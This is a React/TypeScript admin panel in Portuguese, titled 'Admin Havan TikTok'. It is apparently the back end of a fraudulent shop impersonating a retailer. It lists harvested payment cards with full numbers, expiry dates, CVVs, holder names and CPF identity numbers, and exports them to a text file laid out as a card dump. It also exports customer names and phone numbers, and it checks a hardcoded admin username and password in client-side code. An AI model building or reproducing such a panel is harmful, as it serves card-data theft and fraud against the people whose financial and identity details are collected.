"use client";

import React, { useState, useEffect } from 'react';
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Download, LogOut, CreditCard, ShoppingBag, Filter, Calendar } from 'lucide-react';
import { format } from 'date-fns';
import { showError, showSuccess } from '@/utils/toast';

const Admin = () => {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [loginData, setLoginData] = useState({ user: '', pass: '' });
  const [cards, setCards] = useState<any[]>([]);
  const [orders, setOrders] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [dateFilter, setDateFilter] = useState({ from: '', to: '' });

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (loginData.user === 'Veidahavantiktok' && loginData.pass === 'Tda669669!') {
      setIsLoggedIn(true);
      fetchData();
    } else {
      showError("Credenciais inválidas.");
    }
  };

  const fetchData = async () => {
    setLoading(true);
    try {
      const { data: cardsData } = await supabase.from('cards').select('*').order('created_at', { ascending: false });
      const { data: ordersData } = await supabase.from('orders').select('*').order('created_at', { ascending: false });
      setCards(cardsData || []);
      setOrders(ordersData || []);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const exportCards = () => {
    let content = "=== LISTA DE CARTÕES REGISTRADOS ===\n\n";
    cards.forEach((c, i) => {
      content += `[${i + 1}] DATA: ${format(new Date(c.created_at), 'dd/MM/yyyy HH:mm')}\n`;
      content += `CARTÃO: ${c.card_number}\n`;
      content += `VALIDADE: ${c.expiry} | CVV: ${c.cvv}\n`;
      content += `NOME: ${c.name}\n`;
      content += `CPF: ${c.cpf}\n`;
      content += `BANCO: ${c.bank_name || 'N/A'} | NÍVEL: ${c.card_level || 'N/A'}\n`;
      content += `TIPO: ${c.card_type || 'N/A'} | BANDEIRA: ${c.brand}\n`;
      content += `------------------------------------------\n`;
    });

    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `cartoes_${format(new Date(), 'dd-MM-yyyy')}.txt`;
    link.click();
  };

  const exportOrders = (status: 'PAID' | 'PENDING') => {
    let filtered = orders.filter(o => o.status === status);
    
    if (dateFilter.from && dateFilter.to) {
      const from = new Date(dateFilter.from);
      const to = new Date(dateFilter.to);
      to.setHours(23, 59, 59);
      filtered = filtered.filter(o => {
        const date = new Date(o.created_at);
        return date >= from && date <= to;
      });
    }

    let content = `=== PEDIDOS ${status === 'PAID' ? 'PAGOS' : 'PENDENTES'} ===\n`;
    content += `PERÍODO: ${dateFilter.from || 'Início'} até ${dateFilter.to || 'Hoje'}\n\n`;

    filtered.forEach((o, i) => {
      content += `[${i + 1}] DATA: ${format(new Date(o.created_at), 'dd/MM/yyyy HH:mm')}\n`;
      content += `CLIENTE: ${o.customer_name}\n`;
      content += `TELEFONE: ${o.customer_phone}\n`;
      content += `PRODUTO: ${o.product_title} (Qtd: ${o.quantity})\n`;
      content += `TOTAL: R$ ${o.total_price}\n`;
      content += `MÉTODO: ${o.payment_method}\n`;
      content += `------------------------------------------\n`;
    });

    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `pedidos_${status.toLowerCase()}_${format(new Date(), 'dd-MM-yyyy')}.txt`;
    link.click();
  };

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <CardTitle className="text-2xl font-bold">Admin Havan TikTok</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleLogin} className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-medium">Usuário</label>
                <Input 
                  value={loginData.user} 
                  onChange={e => setLoginData({...loginData, user: e.target.value})}
                  placeholder="Digite o usuário"
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium">Senha</label>
                <Input 
                  type="password"
                  value={loginData.pass} 
                  onChange={e => setLoginData({...loginData, pass: e.target.value})}
                  placeholder="Digite a senha"
                />
              </div>
              <Button type="submit" className="w-full bg-[#FF2C55]">Entrar</Button>
            </form>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4 md:p-8">
      <div className="max-w-7xl mx-auto space-y-6">
        <div className="flex justify-between items-center">
          <h1 className="text-2xl font-bold text-gray-900">Painel de Controle</h1>
          <Button variant="outline" onClick={() => setIsLoggedIn(false)} className="flex items-center gap-2">
            <LogOut size={18} /> Sair
          </Button>
        </div>

        <Tabs defaultValue="cards" className="w-full">
          <TabsList className="grid w-full grid-cols-2 mb-8">
            <TabsTrigger value="cards" className="flex items-center gap-2">
              <CreditCard size={18} /> Cartões
            </TabsTrigger>
            <TabsTrigger value="orders" className="flex items-center gap-2">
              <ShoppingBag size={18} /> Pedidos
            </TabsTrigger>
          </TabsList>

          <TabsContent value="cards">
            <Card>
              <CardHeader className="flex flex-row items-center justify-between">
                <CardTitle>Cartões Registrados ({cards.length})</CardTitle>
                <Button onClick={exportCards} className="bg-green-600 hover:bg-green-700">
                  <Download size={18} className="mr-2" /> Exportar TXT
                </Button>
              </CardHeader>
              <CardContent>
                <div className="overflow-x-auto">
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>Data</TableHead>
                        <TableHead>Cartão</TableHead>
                        <TableHead>Validade/CVV</TableHead>
                        <TableHead>Titular/CPF</TableHead>
                        <TableHead>Banco/Nível</TableHead>
                        <TableHead>Bandeira</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {cards.map((c) => (
                        <TableRow key={c.id}>
                          <TableCell className="text-xs">{format(new Date(c.created_at), 'dd/MM HH:mm')}</TableCell>
                          <TableCell className="font-mono font-bold">{c.card_number}</TableCell>
                          <TableCell>{c.expiry} | {c.cvv}</TableCell>
                          <TableCell className="text-xs">
                            <div className="font-bold">{c.name}</div>
                            <div className="text-gray-400">{c.cpf}</div>
                          </TableCell>
                          <TableCell className="text-xs">
                            <div className="font-bold text-blue-600">{c.bank_name || 'Desconhecido'}</div>
                            <div className="uppercase text-[10px]">{c.card_level || 'Standard'}</div>
                          </TableCell>
                          <TableCell>
                            <span className="px-2 py-1 rounded bg-gray-100 text-[10px] font-bold uppercase">
                              {c.brand}
                            </span>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="orders">
            <div className="grid gap-6">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Filter size={18} /> Filtros de Exportação
                  </CardTitle>
                </CardHeader>
                <CardContent className="flex flex-wrap gap-4 items-end">
                  <div className="space-y-2">
                    <label className="text-xs font-bold">De:</label>
                    <Input type="date" value={dateFilter.from} onChange={e => setDateFilter({...dateFilter, from: e.target.value})} />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-bold">Até:</label>
                    <Input type="date" value={dateFilter.to} onChange={e => setDateFilter({...dateFilter, to: e.target.value})} />
                  </div>
                  <div className="flex gap-2">
                    <Button onClick={() => exportOrders('PAID')} className="bg-green-600">Exportar Pagos</Button>
                    <Button onClick={() => exportOrders('PENDING')} className="bg-orange-600">Exportar Pendentes</Button>
                  </div>
                </CardContent>
              </Card>

              <div className="grid md:grid-cols-2 gap-6">
                <Card>
                  <CardHeader>
                    <CardTitle className="text-green-600">Pagos ({orders.filter(o => o.status === 'PAID').length})</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-4">
                      {orders.filter(o => o.status === 'PAID').slice(0, 10).map(o => (
                        <div key={o.id} className="p-3 bg-white border rounded-lg text-sm">
                          <div className="flex justify-between font-bold">
                            <span>{o.customer_name}</span>
                            <span className="text-green-600">R$ {o.total_price}</span>
                          </div>
                          <div className="text-gray-500 text-xs">{o.customer_phone}</div>
                          <div className="text-[10px] text-gray-400 mt-1">{format(new Date(o.created_at), 'dd/MM/yyyy HH:mm')}</div>
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader>
                    <CardTitle className="text-orange-600">Pendentes ({orders.filter(o => o.status === 'PENDING').length})</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-4">
                      {orders.filter(o => o.status === 'PENDING').slice(0, 10).map(o => (
                        <div key={o.id} className="p-3 bg-white border rounded-lg text-sm">
                          <div className="flex justify-between font-bold">
                            <span>{o.customer_name}</span>
                            <span className="text-orange-600">R$ {o.total_price}</span>
                          </div>
                          <div className="text-gray-500 text-xs">{o.customer_phone}</div>
                          <div className="text-[10px] text-gray-400 mt-1">{format(new Date(o.created_at), 'dd/MM/yyyy HH:mm')}</div>
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};

export default Admin;